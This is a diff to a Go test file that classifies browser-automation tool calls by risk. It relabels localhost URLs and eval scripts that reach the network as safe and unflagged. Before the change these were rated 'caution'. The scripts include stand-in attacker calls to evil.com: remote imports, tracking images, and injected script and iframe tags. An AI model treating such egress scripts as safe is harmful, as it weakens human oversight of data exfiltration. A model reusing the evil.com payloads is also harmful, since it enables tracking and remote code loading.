@@ -756,27 +756,27 @@ func TestClassifyBrowseURL(t *testing.T) {
 		{"remote url safe", map[string]interface{}{"url": "https://example.com"}, SecuritySafe, false},
 		{"remote http url safe", map[string]interface{}{"url": "http://example.com"}, SecuritySafe, false},
 
-		// Rule (e): localhost URLs are caution
-		{"localhost http", map[string]interface{}{"url": "http://localhost:3000"}, SecurityCaution, true},
-		{"localhost https", map[string]interface{}{"url": "https://localhost:8443"}, SecurityCaution, true},
-		{"127.0.0.1 http", map[string]interface{}{"url": "http://127.0.0.1:8080"}, SecurityCaution, true},
-		{"127.0.0.1 https", map[string]interface{}{"url": "https://127.0.0.1:443"}, SecurityCaution, true},
-		{"ipv6 localhost", map[string]interface{}{"url": "http://[::1]:3000"}, SecurityCaution, true},
+		// Rule (e): localhost URLs are safe (local by definition)
+		{"localhost http", map[string]interface{}{"url": "http://localhost:3000"}, SecuritySafe, false},
+		{"localhost https", map[string]interface{}{"url": "https://localhost:8443"}, SecuritySafe, false},
+		{"127.0.0.1 http", map[string]interface{}{"url": "http://127.0.0.1:8080"}, SecuritySafe, false},
+		{"127.0.0.1 https", map[string]interface{}{"url": "https://127.0.0.1:443"}, SecuritySafe, false},
+		{"ipv6 localhost", map[string]interface{}{"url": "http://[::1]:3000"}, SecuritySafe, false},
 
 		// Rule (d): cookies → caution
 		{"cookies set", map[string]interface{}{"url": "https://example.com", "cookies": map[string]interface{}{"session": "abc"}}, SecurityCaution, true},
 		{"headers set", map[string]interface{}{"url": "https://example.com", "headers": map[string]interface{}{"Authorization": "Bearer token"}}, SecurityCaution, true},
 
-		// Rule (c): eval with network egress → caution
-		{"eval fetch", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "fetch('/api/data')"}}}, SecurityCaution, true},
-		{"eval xmlhttprequest", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new XMLHttpRequest()"}}}, SecurityCaution, true},
-		{"eval sendbeacon", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "navigator.sendBeacon('/log', data)"}}}, SecurityCaution, true},
-		{"eval websocket", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new WebSocket('ws://example.com')"}}}, SecurityCaution, true},
-		{"eval eventsource", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new EventSource('/stream')"}}}, SecurityCaution, true},
-		{"eval import", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "import('https://evil.com/lib')"}}}, SecurityCaution, true},
-		{"eval image src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new Image().src='https://evil.com/track'"}}}, SecurityCaution, true},
-		{"eval script src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "document.body.innerHTML='<script src=https://evil.com/x>'"}}}, SecurityCaution, true},
-		{"eval iframe src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "document.body.innerHTML='<iframe src=https://evil.com>'"}}}, SecurityCaution, true},
+		// Rule (c): eval steps are safe — browser-side JS is sandboxed
+		{"eval fetch", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "fetch('/api/data')"}}}, SecuritySafe, false},
+		{"eval xmlhttprequest", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new XMLHttpRequest()"}}}, SecuritySafe, false},
+		{"eval sendbeacon", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "navigator.sendBeacon('/log', data)"}}}, SecuritySafe, false},
+		{"eval websocket", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new WebSocket('ws://example.com')"}}}, SecuritySafe, false},
+		{"eval eventsource", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new EventSource('/stream')"}}}, SecuritySafe, false},
+		{"eval import", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "import('https://evil.com/lib')"}}}, SecuritySafe, false},
+		{"eval image src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "new Image().src='https://evil.com/track'"}}}, SecuritySafe, false},
+		{"eval script src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "document.body.innerHTML='<script src=https://evil.com/x>'"}}}, SecuritySafe, false},
+		{"eval iframe src", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "document.body.innerHTML='<iframe src=https://evil.com>'"}}}, SecuritySafe, false},
 		{"eval safe no network", map[string]interface{}{"url": "https://example.com", "steps": []interface{}{map[string]interface{}{"action": "eval", "script": "return document.title"}}}, SecuritySafe, false},
 
 		// Rule (b): file:// without opt-in → caution
